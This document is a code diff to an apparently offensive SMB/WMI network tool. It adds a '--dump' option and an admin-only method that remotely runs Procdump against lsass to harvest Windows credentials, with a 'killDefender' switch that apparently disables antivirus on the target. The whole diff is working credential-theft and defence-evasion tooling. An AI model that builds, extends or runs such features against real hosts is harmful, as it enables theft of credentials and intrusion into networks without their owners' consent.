@@ -212,6 +212,7 @@ class smb(connection):
         execegroup = execgroup.add_mutually_exclusive_group()
         execegroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")
         execegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')
+        execegroup.add_argument("-dump", "--dump", action='store_true', help="Uses Procdumpx64 to dump lsass and retrieve the output.")
 
         supergroup = smb_parser.add_argument_group("Multi-execution Commands")
         supergroup.add_argument("-netrecon", '--netrecon', action='store_true', help='Runs all the stuffs . this is for debugging, use at own risk')
@@ -224,10 +225,8 @@ class smb(connection):
         reggroup.add_argument("-uac-status", '--uac-status', action='store_true', help='Check Remote UAC Status')
 
         servicegroup = smb_parser.add_argument_group("Interact with Services")
-        servicegroup.add_argument("-start-service", '--start-service', action='store_true', help='C')
-        servicegroup.add_argument("-stop-service", '--stop-service', action='store_true', help='Che')
-
-        egroup.add_argument('--user', nargs='?', const='', metavar='USER', help='Enumerate and return all domain users')
+        servicegroup.add_argument("-start-service", '--start-service', action='store_true', help='not finished')
+        servicegroup.add_argument("-stop-service", '--stop-service', action='store_true', help='not finished')
 
         return parser
 
@@ -478,6 +477,31 @@ class smb(connection):
             exec_method.run(self.host, self.host)
         except Exception as e:
             logging.debug('b {}'.format(str(e)))
+
+
+    @requires_admin
+    def dump(self):
+        """Procdump lsass."""
+
+        
+        if self.args.kd:
+            killDefender = True
+        else:
+            killDefender = False
+
+        try:
+            exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender, self.logger)
+            logging.debug('Dumping lsass using wmiexec')
+        except:
+            self.logger.error('Failed to initiate wmiexec')
+            logging.debug('Error launching shell via wmiexec, traceback:')
+            logging.debug(format_exc())
+            return
+
+        try:
+            exec_method.dump()
+        except Exception as e:
+            logging.debug('dump failed because: {}'.format(str(e)))
 
 
 ###############################################################################
